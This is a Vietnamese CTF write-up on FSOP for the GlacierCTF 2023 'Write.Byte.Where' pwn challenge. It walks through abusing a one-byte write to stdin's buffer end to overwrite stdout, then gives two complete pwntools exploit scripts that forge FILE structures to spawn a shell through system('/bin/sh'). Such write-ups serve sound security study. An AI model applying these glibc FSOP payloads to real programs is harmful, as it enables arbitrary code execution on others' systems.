---
title: writeup-FSOP
date: 2025-02-12 00:00:00 +0800
categories: [pwn]
tags: [FSOP]
author: "kuvee"
layout: post
---

- FSOP là 1 kĩ thuật tấn công cấu trúc của ```IO_FILE``` , có rất nhiều bài viết về kĩ thuật này ở google , ta có thể đọc 1 bài viết bằng tiếng việt ở đây [here](https://hackmd.io/@kyr04i/SkF_A-fnn) ... 

## Write.Byte.Where


### overview


- đầu tiên nó sẽ mở ```/proc/self/maps``` và in ra , nói 1 chút về ```/proc/self/maps``` , đây là 1 đường dẫn trỏ đến tiến trình hiện tại , nó sẽ in vùng nhớ được ánh xạ bởi ```maps``` , vì vậy ở đây ta có được libc_leak , exe_leak , stack_leakleak

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int fd; // [rsp+Ch] [rbp-14h]
  _QWORD v4[2]; // [rsp+10h] [rbp-10h] BYREF

  v4[1] = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  v4[0] = 0LL;
  fd = open("/proc/self/maps", 0);
  if ( fd < 0 )
  {
    puts("ERROR opening maps\n");
    exit(1);
  }
  if ( read(fd, proc_self_maps, 0x1000uLL) < 0 )
  {
    puts("ERROR reading from maps\n");
    exit(1);
  }
  close(fd);
  puts(proc_self_maps);
  printf("Here is an extra: %p\n", v4);
  printf("Where: ");
  __isoc99_scanf("%lld", v4);
  getchar();
  printf("What: ");
  __isoc99_scanf("%c", v4[0]);
  getchar();
  puts("Goodbye! (press  Enter  to exit)");
  getchar();
  exit(0);
}
```

- tiếp theo là ta được nhập dũ liệu vào 1 địa chỉ với 1 byte duy nhất , như tên bài thì đây là 1 bài ```write-what-where``` tuy nhiên chỉ write được 1 byte duy nhất và ta cũng nên nhớ rằng ta có tất cả các địa chỉ hữu ích cho việc khai thác

- checksec : chỉ có canary là tắt

```cs
ploi@PhuocLoiiiii:~/pwn/FSOP/GlacierCTF.2023$ checksec vuln_patched
[*] '/home/ploi/pwn/FSOP/GlacierCTF.2023/vuln_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

### exploit

- vậy ta sẽ làm gì với chỉ mỗi 1 byte , ở đây ta sẽ cùng phân tích cách mà ```get_char``` hoạt động , trước hết ta cần biết bố cục của ```_IO_FILE_STRUCT``` :

```cs
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

- ta sẽ phân tích flow của ```get_char``` : 

đầu tiên là sẽ jmp đến ```__uflow``` 

![get_char1](/assets/images/get_char.png)

tiếp theo jmp đến ```_IO_default_uflow``` 

![get_char1](/assets/images/get_char.png)

cuối cùng là call tại [rbp-0x70]

![get_char1](/assets/images/get_char.png)

- ta sẽ cùng xem xét src của ```_IO_file_underflow```

```c
int _IO_new_file_underflow (FILE *fp)
{
  ssize_t count;

  . . .

  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL)
    {
      if (fp->_IO_save_base != NULL)
        {
          free (fp->_IO_save_base);
          fp->_flags &= ~_IO_IN_BACKUP;
        }
      _IO_doallocbuf (fp);
    }

  . . .

  _IO_switch_to_get_mode (fp);

  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);

  . . .

  return *(unsigned char *) fp->_IO_read_ptr;
}
```

- ý định của ta ở bài này là sẽ ghi đè dữ liệu của ```_IO_BUF_END``` để mở rộng được bộ đệm hơn nữa trong memory

![here](/assets/images/fsop.png)

- điều gì sẽ xảy ra khi 1 hàm cố gắng đọc từ ```stdin``` , vd như ```get_char``` , là dữ liệu được gửi trên stdin sẽ được đệm trong bộ đệm và chúng tôi sẽ ghi đè lên phần cuối của ```stdin``` và hơn nữa trong bộ nhớ lên đến ```_Io_buf_end```

![here](/assets/images/fsop2.png)

- và vì ở đây ```stdout``` sẽ nằm xa hơn sau ```sdtin```  0xce0 byte , vì vậy ta có thể ghi được ```stdout```

lúc này ```IO_BUF_END``` đã được mở rộgn thành ```0x7fb2a1132764``` và ta đã ghi đè lên phần còn lại của ```stdin```

![kaka](/assets/images/fsop3.png)

- vì vậy trước hết ta cần setup sao cho các dữ liệu quan trọng ở ```stdin``` sẽ không bị phá hủy , những thứ đó sẽ là ```lock``` , ```offset``` , ```wide_data``` , ```_mode```
- ta sẽ ghi dữ liệu ở vị trí ```_cur_column``` + 3 nên sẽ padding thêm 5 bytes , tiếp theo là ```stdfile_0_lock``` ...

- sau khi overwrite struct ```stdin``` thì ta sẽ padding nó đến ```stdout``` và dùng payload của [nobodyisbody](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#3---the-fsop-way-targetting-stdout)

exp : 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
"""
gdb.attach(p,gdbscript='''
           brva 0x00000000000012E4
           brva 0x0000000000001318
           ''')
"""
exe.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'exe: {hex(exe.address)}')

p.recvlines(8)
libc.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'libc {hex(libc.address)}')
p.recvuntil(b'Here is an extra: ')
stack_leak = int(p.recvline()[:-1],16)
log.info(f'stack: {hex(stack_leak)}')
log.info(f'stdin: {hex(libc.sym._IO_2_1_stdin_)}')
log.info(f'stdout: {hex(libc.sym._IO_2_1_stdout_)}')

_IO_stdfile_0_lock = 0x240720 + libc.address
_IO_wide_data_0 = 0x23e9c0

val = ((libc.sym._IO_2_1_stdout_ + 0x300) & 0xff00) >> 8

input()
p.sendlineafter(b'Where: ',str(libc.sym._IO_2_1_stdin_+0x41))
p.sendafter(b'What: ',p8(val))


stdout_lock = libc.address + 0x240710   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x000000000014a870 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh'.ljust(8,b'\x00'))  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)


payload = b'a'*5 + p64(_IO_stdfile_0_lock) + p64(0xffffffffffffffff) + p64(0) + p64(_IO_wide_data_0 + libc.address) + p64(0)*3 + p64(0x00000000ffffffff)
payload += p64(0)*2 + p64(libc.sym._IO_file_jumps)
payload = payload.ljust(0xc5d,b'a') + bytes(fake)

p.send(payload)
p.interactive()
```

![flagfsop](/assets/images/flagfsop.png)

1 cách khác 

```pythonpython
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
"""
gdb.attach(p,gdbscript='''
           brva 0x00000000000012E4
           brva 0x0000000000001318
           ''')
"""
exe.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'exe: {hex(exe.address)}')

p.recvlines(8)
libc.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'libc {hex(libc.address)}')
p.recvuntil(b'Here is an extra: ')
stack_leak = int(p.recvline()[:-1],16)
log.info(f'stack: {hex(stack_leak)}')
log.info(f'stdin: {hex(libc.sym._IO_2_1_stdin_)}')
log.info(f'stdout: {hex(libc.sym._IO_2_1_stdout_)}')

_IO_stdfile_0_lock = 0x240720 + libc.address
_IO_wide_data_0 = 0x23e9c0

val = ((libc.sym._IO_2_1_stdout_ + 0x300) & 0xff00) >> 8

input()
p.sendlineafter(b'Where: ',str(libc.sym._IO_2_1_stdin_+0x41))
p.sendafter(b'What: ',p8(val))

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):

    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

_IO_file_jumps = libc.symbols['_IO_file_jumps']
stdout = libc.symbols['_IO_2_1_stdout_']
log.info("stdout: " + hex(stdout))
FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
        lock            = libc.symbols['_IO_2_1_stdout_'] + 0x10, \
        _IO_read_ptr    = 0x0, \
        _IO_write_base  = 0x0, \
        _wide_data      = libc.symbols['_IO_2_1_stdout_'] - 0x10, \
        _unused2        = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104), \
        vtable          = libc.symbols['_IO_wfile_jumps'] - 0x20, \
        )

payload = b'a'*5 + p64(_IO_stdfile_0_lock) + p64(0xffffffffffffffff) + p64(0) + p64(_IO_wide_data_0 + libc.address) + p64(0)*3 + p64(0x00000000ffffffff)
payload += p64(0)*2 + p64(libc.sym._IO_file_jumps)
payload = payload.ljust(0xc5d,b'a') + FSOP

p.send(payload)
p.interactive()
```

ref : [>=libc2.35](https://hareh4ru.github.io/pwn/2023/11/23/FSOP-for-libc-2.35-and-over.html)